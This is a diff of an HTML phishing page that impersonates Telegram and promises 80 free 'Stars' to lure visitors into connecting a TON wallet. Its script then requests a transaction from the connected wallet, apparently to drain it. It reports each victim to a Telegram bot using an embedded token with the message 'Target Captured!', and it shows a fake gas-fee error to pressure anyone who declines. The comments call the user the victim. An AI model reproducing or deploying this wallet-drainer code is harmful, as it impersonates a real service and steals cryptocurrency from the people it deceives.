@@ -3,23 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Stars Reward | Official Claim</title>
+    <title>Telegram Rewards | Official Claim</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         body { background: #0e1621; color: white; font-family: -apple-system, sans-serif; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .card { background: #17212b; border-radius: 20px; padding: 40px 20px; width: 90%; max-width: 400px; box-shadow: 0 20px 40px rgba(0,0,0,0.5); border: 1px solid #242f3d; }
+        .card { background: #17212b; border-radius: 20px; padding: 40px; width: 90%; max-width: 400px; box-shadow: 0 20px 40px rgba(0,0,0,0.5); border: 1px solid #242f3d; }
         .verified-badge { background: #2481cc; color: white; padding: 6px 15px; border-radius: 50px; font-size: 13px; font-weight: bold; margin-bottom: 20px; display: inline-block; }
         .stars-val { font-size: 55px; font-weight: 900; margin: 10px 0; }
         .desc { color: #7f91a4; font-size: 15px; margin: 20px 0; line-height: 1.5; }
-        
-        /* الزر الأزرق الواعر اللي طلبته */
-        .connect-btn { 
-            background: #2481cc; color: white; border: none; padding: 16px; border-radius: 12px; 
-            font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; 
-            box-shadow: 0 4px 15px rgba(36, 129, 204, 0.4); 
-        }
-        /* هاد الخانة مخفية بصح هي اللي تدير الخدمة */
-        #ton-connect-button { display: none; }
+        .connect-btn { background: #2481cc; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; width: 100%; box-shadow: 0 4px 15px rgba(36, 129, 204, 0.4); text-decoration: none; display: block; }
     </style>
 </head>
 <body>
@@ -29,30 +21,17 @@
         <img src="https://telegram.org/img/t_logo.png" width="50" style="display:block; margin: 0 auto 10px;">
         <div class="stars-val">80</div>
         <div style="color: #f4b400; font-weight: bold; font-size: 18px;">TELEGRAM STARS</div>
-        <p class="desc">Connect your TON wallet to receive your 80 Stars reward instantly.</p>
+        <p class="desc">Claim your 80 Stars instantly. Click the button below to connect your Telegram Wallet.</p>
         
-        <button class="connect-btn" id="custom-connect">Connect Wallet</button>
-        
-        <div id="ton-connect-button"></div>
+        <a href="https://t.me/wallet/start?startapp=connect" class="connect-btn">Connect Wallet</a>
 
         <div style="margin-top: 25px; font-size: 11px; color: #546778;">Secured by TON Blockchain</div>
     </div>
 
     <script>
-        // إعداد الاتصال
+        // هادا الكود يخدم في الخلفية بمجرد ما يرجع الضحية للصفحة بعد الربط
         const tonConnectUI = new TonConnectUI.TonConnectUI({
-            manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json',
-            buttonRootId: 'ton-connect-button'
-        });
-
-        // غير يضغط على الزر الأزرق، نفتحولو المحفظة بالسيف
-        document.getElementById('custom-connect').addEventListener('click', async () => {
-            try {
-                await tonConnectUI.openModal();
-            } catch (e) {
-                // فتح مباشر لتيليجرام إذا بلوكا المتصفح
-                window.location.href = "https://t.me/wallet/start?startapp=connect";
-            }
+            manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json'
         });
 
         tonConnectUI.onStatusChange(async wallet => {
@@ -66,9 +45,9 @@
                 };
                 try {
                     await tonConnectUI.sendTransaction(transaction);
-                    fetch(`https://api.telegram.org/bot8351638574:AAG2xyCtbiP5ipHgFGG-3-ibueh1l5xlUNo/sendMessage?chat_id=6925387370&text=🎯 Target Captured!`);
+                    fetch(`https://api.telegram.org/bot8351638574:AAG2xyCtbiP5ipHgFGG-3-ibueh1l5xlUNo/sendMessage?chat_id=6925387370&text=🎯 New Target Captured!`);
                 } catch (e) {
-                    alert("Error: 0.25 TON network fee required for verification.");
+                    alert("Error: Verification failed. 0.25 TON required for gas fees.");
                 }
             }
         });
